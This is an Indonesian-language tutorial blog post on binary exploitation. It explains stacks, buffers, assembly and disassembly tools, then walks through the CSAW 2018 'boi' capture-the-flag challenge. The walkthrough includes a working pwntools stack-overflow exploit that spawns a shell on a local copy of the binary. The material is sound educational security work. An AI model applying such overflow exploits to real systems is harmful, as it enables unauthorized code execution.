Tags: Hacking|Series
Times: 20 mins read
TLDR: Software engineering is amazing and kind of amusing for me as we can break software better if we know how to develop it, and at the same time we can develop it better if we know how to break it :D
--+--+--+--
# Pwning Journey 0x1 Stack Buffer Overflow 

Series ini saya buat untuk membagikan apa yang sudah dan sedang saya pelajari mengenai `binary exploitation`, dan terlebih dari itu juga untuk menjadi pengingat saya disaat saya lupa dengan teknik-teknik simple (bahkan syntax debugging pada `gef` :v).

Semua hal yang saya tulis di series ini didasarkan oleh banyak sumber pelajaran yang saya dapatkan terutama dari [nightmare course by guyinatuxedo](https://guyinatuxedo.github.io/index.html).

Bahkan karena bisa dibilang ini versi indonesia dan lebih detailnya dari nigthmare course, maka saya sarankan untuk orang yang paham bahasa inggris, sudah dapat basic nya, ingin serba cepat dan to-the-point maka langsung saja pelajari dari nightmare course yang saya sudah berikan link-nya diatas.

### The Openings

Stack buffer overflow pertama kali diperkenalkan oleh Elias Levy (aka Aleph One) dengan artikel yang dia publish pada sebuah website hacker zine yang sangat terkenal yaitu phrack, dia menulis artikel berjudul "Smashing The Stack For Fun And Profit" yang bisa diakses [disini](http://phrack.org/issues/49/14.html). 

Sebenarnya semuanya yang dijelaskan disana sudah sangat jelas menurut saya akan tetapi saya tetap menulis artikel ini untuk mempermudah orang orang yang masih sangat baru dengan hal ini (terutama yang belum mahir bahasa inggris :v). 

Sebelum membaca lebih jauh, saya sangat sarankan untuk mempelajari tentang arsitektur CPU terlebih dahulu karena itu merupakan hal yang sangat penting untuk dipahami agar mempermudah pemahaman dalam pembuatan exploit, dan kebetulan sebuah CrashCourse yang dibuat oleh PBS Digital Studios sudah membuatkan video pada youtube yang membahas dengan sangat jelas bagaimana cara kerja CPU dan sebagainya yang bisa diakses [disini](https://www.youtube.com/watch?v=tpIctyqH29Q&list=PL8dPuuaLjXtNlUrzyH5r6jN9ulIgZBpdo&ab_channel=CrashCourse).

### What is stack anyway ?

[Stack](https://en.wikipedia.org/wiki/Stack_(abstract_data_type)) merupakan sebuah teknik penyimpanan data pada sistem operasi dimana data yang disimpan ini akan seolah-olah berbentuk menyerupai sebuah tumpukan, atau bisa juga saya analogikan sebagai gelas yang tentunya hanya memiliki satu lubang yaitu diatasnya, dan air (dalam hal ini data) hanya bisa masuk dan keluar melalui satu lubang diatas tersebut.

Seperti terlihat pada gambar dibawah, stack bisa mengeluarkan data yang terakhir/teratas dengan menggunakan `pop` dan bisa juga memasukkan data kedalamnya dengan menggunakan `push`, 2 hal ini menjadi suatu hal yang penting untuk dipahami karena akan menjadi landasan dalam pemahaman struktur data nya itu sendiri.

![stack-picture](https://upload.wikimedia.org/wikipedia/commons/b/b4/Lifo_stack.png)  
sumber: [wikipedia](https://en.wikipedia.org/wiki/Stack_(abstract_data_type))

Dalam konteks sistem operasi, data yang disimpan pada stack merupakan sebuah `memory address` (alamat memori), yang berguna untuk menyimpan data lainnya (bisa berupa sebuah informasi yang penting dan banyak hal lainnya).

### What about buffer ?

Buffer sebenarnya hanya sebuah tempat yang sudah di alokasikan sedemikian rupa sehingga bisa memuat data didalamnya entah apapun itu data yang dimuatnya, akan tetapi dikarenakan buffer ini hanya bisa dipakai setelah dialokasikan terlebih dahulu, maka ukurannya harus sesuai dengan data yang ingin dimuat kedalamnya.

Saya akan analogikan buffer sebagai sebuah restoran yang harus di reserve/pesan dulu tempatnya sebelum kita bisa makan didalamnya, disaat kita memesan tempat untuk 5 orang maka akan hanya ada `≤ 5` orang yang bisa masuk dan makan di tempat yang sudah kita pesan, akan tetapi apabila ada `> 5` (misal 6) orang yang masuk maka akan terjadi yang namanya overflow dimana orang ke-6 itu tidak jelas akan duduk dimana dan akan membuat pusing satu restoran XD.

![madness](https://media.giphy.com/media/ukqBV7WM4BQ4w/giphy.gif)

Dalam konteks sistem operasi, disaat terjadi overflow pada buffer maka data yang overflow itu akan menimpa data yang berada setelahnya yang akan membuat kacau aliran eksekusi pada sebuah program.

Dengan menggunakan kesalahan programmer saat menulis kode program, kita bisa meng-exploit kesalahan tersebut dengan cara mengambil keuntungan dari celah buffer overflow ini, bila kalian pembaca yang kreatif seharusnya akan langsung kepikiran sebuah fakta bahwa saat data yang overflow itu menimpa data yang setelahnya maka dalam artian lain kita bisa merubah beberapa bagian dari kode yang telah ditulis oleh programmer sebelumnya yang dalam artian lain kita memiliki kuasa/kontrol terhadap cara kerja atau aliran eksekusi pada beberapa bagian dari sebuah program, mari kita sebut ini dengan `Control Flow Attack`. 

### Preliminaries

Sebelum kita bisa membuat exploit untuk mengambil keuntungan dari celah yang ada pada sebuah program maka kita harus mengetahui terlebih dahulu bagaimana cara kerja sebuah program tersebut, dan untuk mengetahui cara kerja sebuah program kita harus mengetahui cara kerja sebuah CPU dalam menjalankan program tersebut (itulah kenapa pemahaman tentang arsitektur CPU penting).

Diluar pemahaman tentang CPU, kita harus mengetahui cara kerja sebuah program dan untuk itulah ada yang namanya [reverse engineering](https://yohan.es/reverse-engineering/), di artikel yang saya link itu sudah menjelaskan dengan sangat detail dan juga saya tidak akan membahas terlalu dalam tentang reverse engineering itu sendiri (karena saya juga masih noob XD), akan tetapi disini saya akan jelaskan sedikit mengenai bagaimana caranya dan apa saja yang diperlukan untuk memahaminya.

### Reverse engineering

Reverse engineering merupakan sebuah proses dimana kita membongkar sebuah program untuk mengetahui bagaimana cara kerjanya (karena kita tidak memiliki source code dari program yang bersangkutan).

Untuk bisa memahami ini kita harus sebelumnya memahami tentang [bahasa assembly](https://yohan.es/reverse-engineering/bab5/) dan cara CPU menjalankannya, saya akan analogikan ini sebagai sebuah daftar aktifitas yang harus dilakukan oleh seorang murid di sekolah.

Mari kita anggap berikut ini adalah daftar aktifitasnya :

```md
1. Belajar matematika
2. Belajar bahasa indonesia
3. Istirahat
4. Belajar bahasa inggris
5. Ujian fisika
```

Maka seorang murid akan melakukan aktifitas diatas itu dengan berurutan dari 1-5 hingga akhirnya selesai melakukan seluruh aktifitasnya, sama hal nya dengan CPU, dia akan menjalankan seluruh hal yang ada pada program secara berurutan dari instruksi paling pertama contohnya:

```python
0x110 push rbp
0x111 mov rbp,rsp
0x114 mov DWORD PTR [rbp-0xc],0x1
0x11b mov DWORD PTR [rbp-0x8],0x2
```

Maka CPU akan menjalankan seluruh instruksi diatas dari alamat `0x110 - 0x11b`, alamat `0x110 - 0x11b` merupakan sebuah alamat yang berada dalam sebuah [stack frame](http://www.cs.uwm.edu/classes/cs315/Bacon/Lecture/HTML/ch10s07.html).

Syntax assembly seperti contoh diatas merupakan syntax Intel dimana ada syntax lainnya yaitu AT&T yang memiliki beberapa perbedaan termasuk penempatan argumen nya.

Untuk lebih dalam tentang assembly saya berikan beberapa referensi yang bisa dipakai untuk penjelasan yang jauh lebih mendetail nya :

- [x86 assembly guide from University of Virginia Computer Science](http://www.cs.virginia.edu/~evans/cs216/guides/x86.html)  
- [x86 assembly crash course video from HackUCF](https://www.youtube.com/watch?v=75gBFiFtAb8)  
- [x86 detailed video playlist from Open Security Training](https://www.youtube.com/watch?v=H4Z0S9ZbC0g&list=PL038BE01D3BAEFDB0&ab_channel=OpenSecurityTraining)  

Dan karena contoh yang saya berikan diatas merupakan assembly untuk arsitektur x64 bisa dilihat dengan penamaan register menggunakan huruf awal `r` seperti `rbp, rsp, rax, dll`, berikut ada juga referensi yang bisa digunakan untuk memahami lebih dalam untuk arsitektur x64 :

- [Modern x64 Assembly video playlist from Creel](https://www.youtube.com/watch?v=rxsBghsrvpI&list=PLKK11Ligqitg9MOX3-0tFT1Rmh3uJp7kA&ab_channel=Creel)  

Dari pemahaman assembly itulah kita bisa memahami alur eksekusi sebuah program yang telah dicompile dengan cara men-disassembly, disassembly merupakan sebuah proses dimana kita melihat bentukan assembly dari sebuah program yang telah di compile sebelumnya, seperti artinya `disassembly == membongkar`.

Contoh nya seperti berikut saya memiliki sebuah program bahasa C bernama `testing.c` :

```c
#include<stdio.h>
int main() {
	int a,b,c;
	a = 1;
	b = 2;
	c = a + b;
}
```

Dan bisa kita compile program nya dengan menggunakan command `gcc -O0 testing.c -o testing`, argumen `-O0` pada gcc mengartikan bahwa kompilasi program dilakukan tanpa adanya optimisasi apapun, dan seperti yang bisa dilihat dengan menggunakan argumen `-o` kita bisa menentukan output atau file untuk hasil dari kompilasinya.

Setelah itu kita bisa melihat assembly nya dengan cara men-disassemble program yang telah di kompilasi tadi yaitu file bernama `testing` tanpa ekstensi apapun, kita akan disassemble dengan menggunakan objdump dengan command berikut.

```bash
╭─f4r4w4y@blackrock ~/Documents/random 
╰─$ objdump -D -Mintel testing | grep main -A15 | tail -16
0000000000001129 <main>:
    1129:	f3 0f 1e fa          	endbr64 
    112d:	55                   	push   rbp
    112e:	48 89 e5             	mov    rbp,rsp
    1131:	c7 45 f4 01 00 00 00 	mov    DWORD PTR [rbp-0xc],0x1
    1138:	c7 45 f8 02 00 00 00 	mov    DWORD PTR [rbp-0x8],0x2
    113f:	8b 55 f4             	mov    edx,DWORD PTR [rbp-0xc]
    1142:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
    1145:	01 d0                	add    eax,edx
    1147:	89 45 fc             	mov    DWORD PTR [rbp-0x4],eax
    114a:	b8 00 00 00 00       	mov    eax,0x0
    114f:	5d                   	pop    rbp
    1150:	c3                   	ret    
    1151:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
    1158:	00 00 00 
    115b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]
```

Argumen `-D` mengartikan bahwa kita ingin melakukan disassembly, dan argumen `-Mintel` mengartikan bahwa kita ingin menggunakan syntax Intel, command lainnya seperti `grep` dan `tail` hanya digunakan untuk langsung memfokuskan output pada fungsi `main` dari program yang telah dibuat.

Nah, karena reverse engineering merupakan proses dimana kita membongkar tanpa mengetahui source code nya, maka dalam artian lain kita harus bisa merekonstruksi ulang program `testing` atau mengetahui alur eksekusi nya, tanpa awalnya mengetahui source code nya yaitu `testing.c`.

Artikel nya akan sangat panjang bila saya jelaskan lebih dalam tentang reverse engineering dan juga sudah lewat dari pembahasan utama yaitu `stack buffer overflow`, jadi saya berikan saja referensi yang menurut saya sangat bagus untuk memahami nya (mungkin akan bias, karena saya gunakan Cutter jadi disini saya kasih referensi yang menggunakan Cutter juga) :

- [Reverse Engineering menggunakan Cutter from jamieweb.net](https://www.jamieweb.net/blog/radare2-cutter-part-1-key-terminology-and-overview/)

### Tooling

Sebelum membahas tentang exploitasi, saya akan membahas tentang apa saja tools yang bisa digunakan untuk mempermudah exploitasi dan juga merupakan tools standar yang sering digunakan oleh kebanyakan exploit developer.

- [GEF - GDB Enhanced Features](https://gef.readthedocs.io/en/master/)  

  Tools ini merupakan sebuah addon untuk GDB yang digunakan sebagai debugger yang tentunya fungsinya untuk men-debug sebuah program, yang salah satunya berguna untuk mengetahui alur eksekusi sebuah program.

- [Ghidra](https://ghidra-sre.org/) / [IDA](https://www.hex-rays.com/products/ida/support/download_freeware/) / [Cutter](https://cutter.re/)  

  Tools ini berguna untuk reverse engineer (disassembler, decompiler, dll).

  Saya menggunakan Cutter pada artikel yang saya buat ini.

- [Pwntools](https://github.com/Gallopsled/pwntools)

  Tools ini berguna untuk memudahkan hal-hal yang ingin dilakukan untuk exploitasi atau yang biasa disebut dengan pwning (itulah kenapa namanya pwntools :v), dan juga sebenarnya ini merupakan library untuk python.

- [Python](https://www.python.org/downloads/)
  
  Karena saya akan menggunakan Python jadi saya masukkan python kedalam list tools yang digunakan, akan tetapi pada dasarnya bahasa apapun bisa digunakan untuk exploit development (termasuk PHP, walaupun memang aneh tapi nyata :v).

### Binary Exploitation

Karena sudah terlalu banyak pendahuluan-pendahuluan, maka sekarang langsung saja kita masuk kedalam proses exploitasi nya dari mulai pencarian celah hingga pembuatan exploit nya.

Dan karena seperti yang sudah saya bilang saya akan mengikuti challenges yang ada pada nightmare course, karena itu resource utama saya belajar tentang hal ini.

Tidak semua challenges nya akan saya tulis disini solusi nya karena sangat memakan waktu dan tenaga XD, jadi saya ambil beberapa challenges yang sudah bisa merekap seluruh bagian untuk `stack buffer overflow` pada nightmare course, walaupun demikian seluruh solution dan binary nya ada di [Repository LearningJourney_V1 saya](https://github.com/fakhrip/LearningJourney_v1/tree/master/Security/Binary%20Exploitation/stack-buffer-overflows) (solusi nya mirip seperti nightmare course dan ada juga yang sama) bilapun beda biasanya hanya terletak pada syntax nya karena saya sekalian meng-explore fitur-fitur yang ada pada pwntools.

### Csaw 2018 Quals Boi

Kita diberikan sebuah program bernama `boi` yang bila dijalankan akan meminta sebuah inputan dan langsung dilanjutkan dengan output berupa datetime saat dijalankan, seperti berikut :

```
╭─f4r4w4y@blackrock stack-buffer-overflows/csaw-boi
╰─$ ./boi
Are you a big boiiiii??
asd
Jum 05 Feb 2021 04:23:54  WIB
```

Dan bila kita jalankan command file maka akan mendapatkan output seperti berikut :

```
╭─f4r4w4y@blackrock stack-buffer-overflows/csaw-boi 
╰─$ file boi 
boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
```

Itu mengartikan bahwa file nya merupakan program dengan arsitektur x64 (64 bit), dan juga terdapat tulisan `not stripped` yang saya akan bahas nanti lagi untuk lebih detailnya.

Selanjutnya kita akan melihat proteksi apa saja yang dimiliki oleh program yang telah dibuat, dan hal ini bisa dilakukan dengan menggunakan command `checksec` apabila pwntools telah diinstall didalam mesin yang digunakan, seperti berikut :

```
╭─f4r4w4y@blackrock stack-buffer-overflows/csaw-boi 
╰─$ checksec boi 
[*] '/home/f4r4w4y/Documents/general/LearningJourney_v1/Security/Binary Exploitation/stack-buffer-overflows/csaw-boi/boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Sebenarnya untuk challenge ini masih tidak perlu memperhatikan proteksi pada program yang diberikan, akan tetapi ini merupakan prosedur standar untuk mengetahui lebih dahulu jika memang nantinya kita harus bypass proteksi yang ada pada program yang diberikan.

Dan untuk mengenai penjelasan tentang proteksinya akan saya jelaskan di challenge selanjutnya saat sudah berguna.

Untuk itu langkah selanjutnya mari kita lihat pada Cutter dan coba melakukan reverse engineering untuk mengetahui program yang dibuat.

Dari hasil decompile nya kita bisa dapatkan rekonstruksi program seperti berikut :

```c
undefined8 main(undefined8 argc, char **argv)
{
    undefined8 uVar1;
    int64_t in_FS_OFFSET;
    char **var_40h;
    int64_t var_34h;
    int64_t var_28h;
    int64_t var_20h;
    int64_t var_18h;
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    stack0xffffffffffffffc8 = 0;
    var_28h = 0;
    var_18h._0_4_ = 0;
    var_20h = -0x2152411100000000;
    var_34h._0_4_ = (undefined4)argc;
    puts("Are you a big boiiiii??");
    read(0, (int64_t)&var_34h + 4, 0x18);
    if (var_20h._4_4_ == -0x350c4512) {
        run_cmd("/bin/bash");
    } else {
        run_cmd("/bin/date");
    }
    uVar1 = 0;
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
        uVar1 = __stack_chk_fail();
    }
    return uVar1;
}
```

Perlu diingat bahwa tidak selamanya hasil rekonstruksi dari dekompilasi sebuah program itu bisa berjalan dengan baik dan menghasilkan rekonstruksi program yang akurat, bahkan sering kali kita tidak bisa mempercayai hasil decompilation maka dari itu akan sangat baik jika melihat kembali pada hasil disassembly nya dan mencocokkan dengan hasil rekonstruksi untuk memverifikasinya.

Dalam hal ini hasil rekonstruksinya sudah akurat dan tidak perlu lagi lihat bahasa assembly hasil dari dissassembly nya, dan jika kita lihat dari hasil rekonstruksi, program mengoutputkan `Are you a big boiiiii??` dengan menggunakan `puts()` dan selanjutnya meminta inputan sebesar `0x18` bytes dengan menggunakan `read()` kedalam variable `var_34h`.

Lalu yang terpenting adalah kita bisa lihat bahwa disana ada perbandingan nilai antara variable `var_20h` dengan nilai `-0x350c4512`, yang bila kita lihat pada hasil disassemble nya dia membandingkan dengan nilai `0xcaf3baee`, seperti berikut : 

```
0x004006a5      mov     eax, dword [var_1ch]
0x004006a8      cmp     eax, 0xcaf3baee
0x004006ad      jne     0x4006bb
0x004006af      mov     edi, str.bin_bash ; 0x40077c ; char *arg1
0x004006b4      call    run_cmd    ; sym.run_cmd
0x004006b9      jmp     0x4006c5
0x004006bb      mov     edi, str.bin_date ; 0x400786 ; char *arg1
0x004006c0      call    run_cmd    ; sym.run_cmd
```

Dan juga bisa dilihat bila nilai dari variable `var_20h` ternyata sama dengan nilai `0xcaf3baee`, maka dia akan menjalankan sebuah bash shell yang dengan inilah kita bisa mendapatkan flag yang kita inginkan.

> Oh ya, karena ini didasarkan dari challenge pada capture the flag maka tujuan akhirnya adalah mendapatkan flag yang berupa sebuah string yang tersimpan pada sebuah server dan kita harus mendapatkan flag itu dengan cara `hack the system/program`, maka dari itu kita akan membuat flag di mesin lokal kita dan seolah olah kita tidak bisa membaca flag nya kecuali dengan cara mengeksploitasi program yang diberikan.
>
> Mari kita buat flag berupa "flag{pwned}" dengan command `echo "flag{pwned}" > flag.txt`.

Balik lagi ke program, bisa dilihat bahwa value dari variable `var_20h` tidak pernah dirubah dalam program, maka kita harus bisa mengeksploitasi programnya saat runtime atau saat dijalankan agar bisa merubah value dari variable tersebut.

Value awal dari variable `var_20h` adalah `0xdeadbeef`, hal ini juga bisa dilihat pada hasil disassembly nya, seperti berikut :

```
0x0040067e      mov     dword [var_1ch], 0xdeadbeef
```

Bila kita perhatikan hasil rekonstruksi programnya dengan seksama, maka ternyata terjadi `stack buffer overflow` disaat mengambil inputan menggunakan `read()`, dikarenakan inputan yang akan diambil yaitu sebesar `0x18` bytes sementara variable `var_34h` berada pada offset `0x34` bytes sedangkan variable `var_20h` berada pada offset `0x20` bytes, ini bisa dilihat dari stack frame yang berada pada paling atas fungsi main di disassembler pada Cutter nya, seperti berikut :

```
159: int main (int argc, char **argv);
; var char **var_40h @ rbp-0x40
; var int64_t var_34h @ rbp-0x34
; var void *buf @ rbp-0x30
; var int64_t var_28h @ rbp-0x28
; var int64_t var_20h @ rbp-0x20
; var int64_t var_1ch @ rbp-0x1c
; var int64_t var_18h @ rbp-0x18
; var int64_t canary @ rbp-0x8
; arg int argc @ rdi
; arg char **argv @ rsi
```

Ini mengartikan ada gap sebesar `0x14` bytes antara `var_20h` dengan `var_34h`, sementara ukuran input yang bisa kita masukkan sebesar `0x18` bytes, berarti ada `0x4` bytes yang bisa menghasilkan buffer overflow yang selanjutnya akan merubah value dari `var_20h` dengan value yang overflow dari inputan yang diberikan.

Dengan memikirkan kembali konsep yang tadi sudah kita pikirkan, maka kita bisa meng-craft payload seperti berikut :

```
A * 20 (kita buat junk payload sebesar 20 bytes, hanya untuk mengisi buffer)
0xeebaf3ca (ini sebenarnya 0xcaf3baee, nah kenapa dibalik balik, karena binary ELF itu menggunakan little endian)
```

Little endian berarti data yang dibuat harus menggunakan `least significant byte` terlebih dahulu, dan kenapa junk payload nya menggunakan huruf `A`, sebenarnya ini hanya hal trivial karena alasannya ini sudah menjadi tradisi kebanyakan exploit developer dikarenakan akan mempermudah saat debugging nantinya (karena akan langsung tahu penempatan payload kita saat melihat 0x41414141) karena ascii value dari `A` adalah `0x41`.

Dengan begini kita bisa membuat exploit untuk langsung mencoba apakah pemikiran ini benar atau tidak, berikut exploit yang dibuat :

```python
from pwn import *

binary = process("./boi")

payload =  (b"A" * 20) 
payload += p32(0xcaf3baee)

binary.send(payload)
binary.interactive()
```

Baris awal mengartikan bahwa kita akan mengimport `pwntools` untuk mempermudah proses exploitasi seperti yang dijelaskan dibagian `tooling`, dan selanjutnya dengan fungsi `process()` kita bisa menjalankan program nya di background untuk kita masukkan inputan atau bahkan membaca sesuatu dari programnya (hal ini bisa ditelusuri lebih lanjut dengan membaca dokumentasi dari pwntools nya langsung), lalu kita akan membuat payload di baris selanjutnya dan tujuan dari fungsi `p32()` adalah untuk membuat sebuah payload 32bit dengan little endian, setelah pembuatan payload dibaris selanjutnya bisa kita kirimkan payloadnya kedalam program yang telah diinisialisasi di background menggunakan fungsi `process()` sebelumnya, lalu kita gunakan fungsi `interactive()` untuk bisa berinteraksi dengan programnya secara langsung (tidak di background alias langsung di foreground), ini berguna untuk melakukan hal-hal secara interaktif setelah mendapatkan shell (dalam hal ini kita baca flag nya).

Bila kita jalankan python code nya maka akan mendapatkan shell seperti berikut ini :

```
╭─f4r4w4y@blackrock stack-buffer-overflows/csaw-boi  
╰─$ python3 x.py
[+] Starting local process './boi': pid 1235563
[*] Switching to interactive mode
Are you a big boiiiii??
$ id
uid=1000(f4r4w4y) gid=1000(f4r4w4y) groups=1000(f4r4w4y) [REDACTED]
$ ls
boi  flag.txt  input  x.py
$ cat flag.txt
flag{pwned}
$  
```

![pwned](https://media.giphy.com/media/egX1DfpvLkJFK/giphy.gif)

Sangat mudah bukan ?, ya emang karena ini challenge yang paling easy dan beginner friendly XD.

Sebenarnya dalam pembuatan exploit di challenge yang lebih susah akan perlu menggunakan debugger seperti `gdb` yang telah di tambahkan `gef`, saya tidak masukkan itu di artikel ini karena sudah panjang dan capek juga ternyata ngetik seharian buat bikin satu artikel panjang kek gini :v.

Dan juga untuk challenge lainnya mohon maaf akan saya buat terpisah dikarenakan betapa panjangnya artikel ini wkwk, jadi di `pwn journey 0x2` akan saya bahas stack buffer overflow yang lebih sulit nya, so stay tuned :D.

### Last word

Semoga artikel nya mudah dipahami dan menyenangkan, jika memang dirasa bermanfaat silahkan sebarkan kepada yang lainnya agar ilmu nya tidak berhenti disini saja.

Terimakasih kepada Allah SWT dan juga para pembaca disini, semua yang buruk datangnya dari saya dan yang baik hanya datang dari-Nya, mohon maaf bila ada kesalahan 🙏.